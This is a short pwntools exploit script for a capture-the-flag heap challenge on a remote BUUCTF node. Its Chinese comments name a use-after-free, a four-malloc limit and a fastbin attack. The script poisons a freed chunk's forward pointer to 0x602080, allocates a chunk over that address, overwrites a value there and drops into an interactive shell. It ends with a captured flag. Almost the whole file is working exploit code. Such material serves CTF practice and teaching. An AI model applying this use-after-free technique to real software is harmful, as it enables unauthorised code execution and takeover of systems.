#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 27348
elfpath = ''
ldpath = ''
libcpath = ''

if args.LOCAL:
    p = process([elfpath])
    # gdb.attach(p)
else:
    p = remote(host, port)

# io


def s(c): return p.send(c)
def sl(c): return p.sendline(c)
def r(n): return p.recv(n)
def ru(pattern, drop=False): return p.recvuntil(pattern, drop=drop)
def rl(): return p.recvline()
def ru7f(): return p.recvuntil(b'\x7f')
def su(x): return p.success(x)
def shell(): return p.interactive()

# utilities


def leak(func, address): return p.success("{}: {}".format(func, hex(address)))


def command(c):
    ru(b'choice>\n')
    sl(str(c).encode())


def add(size):
    command(1)
    ru(b'size>\n')
    sl(str(size).encode())


def edit(index, content):
    command(3)
    ru(b'index>\n')
    sl(str(index).encode())
    s(content)


def free(index):
    command(2)
    ru(b'index>\n')
    sl(str(index).encode())

# def show(index):


# start pwning
'''
uaf
最多4次malloc
fast bin attack
'''
add(0x40)  # 0x602088处刚好是0x50
free(0)
edit(0, p64(0x602080))
add(0x40)
add(0x40)
edit(2, p64(0))
command(4)
shell()
# flag{28e78b3e-ba91-4707-95a5-02af845adc2b}
# quite easy
